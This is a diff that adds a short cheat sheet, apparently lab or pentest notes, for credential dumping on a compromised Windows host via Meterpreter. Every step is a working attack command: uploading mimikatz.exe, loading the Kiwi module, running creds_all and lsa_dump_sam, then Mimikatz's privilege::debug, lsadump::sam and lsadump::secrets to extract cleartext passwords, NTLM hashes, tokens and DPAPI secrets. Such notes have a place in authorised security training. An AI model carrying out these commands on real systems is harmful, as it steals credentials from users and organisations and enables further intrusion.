@@ -1,0 +1,55 @@
+#########################################################
+# Mimikatz – Credential Dumping via Meterpreter         #
+#########################################################
+
+-----------------------------------------
+1. Navigate to C: drive and prepare folder
+-----------------------------------------
+cd C:\
+mkdir TEMP
+cd TEMP
+
+-----------------------------------------
+2. Upload mimikatz.exe to Windows machine
+-----------------------------------------
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\TEMP\\mimikatz.exe
+# Uploaded successfully inside TEMP directory
+
+-----------------------------------------
+3. Load Kiwi module in MSF
+-----------------------------------------
+load kiwi
+# Kiwi module loaded successfully
+
+-----------------------------------------
+4. Dump credentials using Kiwi module
+-----------------------------------------
+creds_all
+# Dumped credentials (cleartext + NTLM hashes + tokens)
+
+lsa_dump_sam
+# Retrieved SAM file contents
+
+-----------------------------------------
+5. Open Windows CMD shell from meterpreter
+-----------------------------------------
+shell
+# Now inside Windows command shell
+
+-----------------------------------------
+6. Execute mimikatz.exe from TEMP directory (CLI)
+-----------------------------------------
+.\mimikatz.exe
+# Mimikatz shell successfully opened
+
+-----------------------------------------
+7. Run Mimikatz credential dump commands
+-----------------------------------------
+privilege::debug
+# Output: "20 OK" → success, debug privileges enabled
+
+lsadump::sam
+# Dumps SAM database (password hashes)
+
+lsadump::secrets
+# Dumps DPAPI secrets, NTLM hashes, service account secrets, etc.
